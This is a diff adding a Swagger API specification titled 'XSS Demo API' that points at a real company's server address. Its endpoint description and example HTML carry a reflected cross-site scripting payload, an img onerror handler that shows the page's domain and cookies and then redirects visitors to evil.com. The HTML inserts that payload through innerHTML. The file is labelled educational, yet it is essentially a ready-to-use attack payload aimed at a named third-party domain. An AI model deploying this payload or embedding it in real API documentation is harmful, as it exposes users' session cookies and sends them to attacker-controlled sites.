@@ -1,0 +1,47 @@
+swagger: '2.0'
+info:
+  title: XSS Demo API
+  description: API to demonstrate XSS vulnerability
+  version: 1.0.0
+servers:
+  - url: https://supply-xml.booking.com/
+paths:
+  /xss-demo:
+    get:
+      summary: Demonstrates XSS vulnerability
+      description: |
+        This endpoint demonstrates a reflected XSS vulnerability.
+        
+        **Security Warning**: This is for educational purposes only.
+        
+        Payload to test:
+        ```
+        <img src=x onerror="alert('You have been hacked!! \nDomain: ' + document.domain + '\nCookie: ' + document.cookie); window.location='https://evil.com';">
+        ```
+      responses:
+        '200':
+          description: Vulnerable page
+          content:
+            text/html:
+              schema:
+                type: string
+                example: |
+                  <!DOCTYPE html>
+                  <html>
+                  <head><title>XSS Demo</title></head>
+                  <body>
+                    <h1>XSS Demo Page</h1>
+                    <button onclick="executeXSS()">Click Me!</button>
+                    <div id="output"></div>
+                    
+                    <script>
+                      function executeXSS() {
+                        // Create the XSS payload element
+                        var payload = "<img src=x onerror=\"alert('You have been hacked!! \\nDomain: ' + document.domain + '\\nCookie: ' + document.cookie); window.location='https://evil.com';\">";
+                        
+                        // Insert into DOM (this simulates vulnerable insertion)
+                        document.getElementById('output').innerHTML = payload;
+                      }
+                    </script>
+                  </body>
+                  </html>
